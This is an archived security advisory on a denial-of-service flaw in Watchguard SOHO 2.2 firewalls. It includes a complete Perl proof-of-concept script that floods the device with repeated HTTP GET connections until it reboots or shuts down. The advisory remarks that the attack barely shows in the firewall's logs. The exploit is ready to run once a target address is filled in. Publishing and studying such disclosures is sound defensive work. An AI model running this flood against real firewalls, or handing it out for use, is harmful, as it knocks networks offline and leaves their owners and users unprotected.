source: http://www.securityfocus.com/bid/2082/info

The SOHO 2.2 is a popular SOHO firewall by Watchguard Technologies Inc.

A vulnerability exists in Watchguard SOHO 2.2 firewalls with firmware versions 2.2.1 and below that could allow a remote attacker to execute a Denial of Service attack on the firewall and render it in-operable.

It is possible for a remote attacker to issue large amounts of GET requests (70+) to the firewall which will in turn deplete memory resources on the firewall and either cause it to reboot or shutdown completely. In the case of a reboot, the firewall will be in-operable for one to five minutes. If the firewall shuts down completely, it will require a power recycle. In the case of a sustained attack, the firewall can be permanently taken off-line. It should be noted that this attack does not appear in the firewall logs except for a reboot notification. 

#!/usr/bin/perl
#
# You can also connect to the Watchguard SOHO through your
# browser and press F5 like a maniac on speed to get the
# firewall crashing. So, either you run the .pl script or
# you fire up your webbrowser... Either way, it works.
# ----------------------------------------------------------
# Disclaimer: this file is intended as proof of concept, and
# is not intended to be used for illegal purposes. I accept
# no responsibility for damage incurred by the use of it.
# ----------------------------------------------------------
# (c)Proof of concept, vorlon <filip@securax.be>
# ----------------------------------------------------------
use IO::Socket;

$host = "your_watchguard_ip";
$port = "your_port";
$repeat = "100";
$request = "GET / HTTP/1.0";

print "Watchguard SOHO Denial of Service, connecting to $host:$port...\n";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host, PeerPort=>$port) ||
die "Failed.\n";

$counter = 0;
print "Repeating request for $repeat times.\n";
while($counter < $repeat) {
print $socket "$request\n";
$socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>$host,
PeerPort=>$port) || die "\nThe Watchguard SOHO has crashed. BEEFCAKE!...\n";
print ".";
$counter += 1;
}
print "\nDone.\n\n";

close($socket); 